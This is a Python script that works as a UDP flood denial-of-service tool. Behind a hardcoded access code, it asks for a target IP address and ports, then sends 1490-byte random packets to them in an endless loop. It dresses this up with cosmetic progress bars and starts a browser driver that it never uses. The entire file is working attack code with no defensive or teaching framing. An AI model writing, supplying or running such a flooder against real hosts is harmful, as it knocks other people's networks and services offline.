import time
import os
import subprocess
import socket
import random
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

times = "1"
percentage = "[                    ] 0%"
percentage1 = "[=                   ] 5%"
num = 5
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
firewall = input("Enter access code: ")

if firewall == '141205':
    ip = input("Enter IP: ").strip()

    if not ip:
        print("Invalid IP")
        time.sleep(0.3)
        os._exit(0)

    ports = input("Enter ports : ").strip()
    port_list = [int(p) for p in ports.split(",") if p.isdigit()]

    if not port_list:
        print("No valid ports provided.")
        time.sleep(0.3)
        os._exit(0)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(1490)

    sent = 0


    def send_packets():
        global sent
        for port in port_list:
            try:
                sock.sendto(packet_data, (ip, port))
                sent += 1
                print(f"Sent {sent} packet(s) to {ip} through port {port}")
                time.sleep(0.01)
            except Exception as e:
                print(f"Error sending packet(s): {e}")

    time.sleep(0.3)
    print(percentage)
    time.sleep(0.1)
    print(percentage1)
    time.sleep(0.1)

    for i in range(19):
        num = num + 5
        times = times + "1"
        percentage = times + "00000000000000000000"[len(times):]
        percentage = percentage.replace("0", " ")
        percentage = percentage.replace("1", "=")
        print(f"[{percentage}] {num}%")
        time.sleep(0.1)

    while True:
        try:
            conf = int(input("Proceed?: "))
            if conf == 0:
                time.sleep(0.3)
                os._exit(0)
            elif conf == 1:
                print("Starting packet send...")
                for i in range(5):
                    print(f"[{'=' * (i + 1)}{' ' * (4 - i)}] {((i + 1) * 20)}%")
                    time.sleep(0.5)

                while True:
                    send_packets()
                    print(f"Total packets sent: {sent}")

        except ValueError:
            print("Invalid input. Enter 1 or 0.")

else:
    print("Error")
    os._exit(0)

